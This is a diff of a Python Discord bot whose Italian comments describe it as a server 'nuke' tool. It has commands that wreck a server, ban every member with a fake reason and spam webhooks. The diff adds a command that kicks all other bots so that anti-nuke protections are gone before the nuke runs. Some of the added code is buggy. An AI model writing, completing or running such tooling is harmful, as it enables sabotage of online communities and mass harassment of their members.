@@ -15,14 +15,14 @@ import asyncio
 import aiohttp
 
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix=",", intents=intents)
+bot = commands.Bot(command_prefix=",", intents=intents) #intents e prefisso ,
 
 @bot.event
 async def on_ready():
-    print(f"Logged in as {bot.user}")
+    print(f"Logged in as {bot.user}") # manda un messaggio in cmd quando lo accendi
 
 # ----------------------------------------------------------------------------
-@bot.command()
+@bot.command() # comando di nuke vero e proprio (da fixxare molto buggato)
 async def x(ctx):
     guild = ctx.guild
     
@@ -49,7 +49,7 @@ async def x(ctx):
     
 
 # ----------------------------------------------------------------------------
-@bot.command()
+@bot.command() # comando che banna tutti gli utenti del server con motivazione finta (da fare dopo il completamento nel nuke)
 async def banall(ctx):
     guild = ctx.guild
     
@@ -66,7 +66,7 @@ async def banall(ctx):
     await ctx.send(f"banned {count} users.")
 
 # ----------------------------------------------------------------------------
-@bot.command()
+@bot.command() # spammer di webhook
 async def whs(ctx, webhook_url: str, *, message: str):
     
     async with aiohttp.ClientSession() as session:
@@ -79,5 +79,26 @@ async def whs(ctx, webhook_url: str, *, message: str):
                 pass
     
     await ctx.send("done")
+    
+# ----------------------------------------------------------------------------
+@bot.command() # kicka tutti i bot (usarlo prima di ,x per togliere antinukers)
+async def kickbots(ctx):
+    guild = ctx.guild
+    bot_id = bot.user.id
 
+    kick_tasks = []
+    count = 0
+
+    for member in ctx.guild.members:
+       if member.bot and member.id != bot_id:
+        kick_tasks.append(member.kick(reason="bot kick"))
+        count += 1
+    if len(kick_tasks) >= 20:
+       await asyncio.gather(kick_tasks, return_exceptions=True)
+       kick_tasks = []
+    if kick_tasks:
+      await asyncio.gather(kick_tasks, return_exceptions=True)
+      await ctx.send(f"kicked {count} bots.")
+# ----------------------------------------------------------------------------
+# bot running
 bot.run("YOUR_BOT_TOKEN")
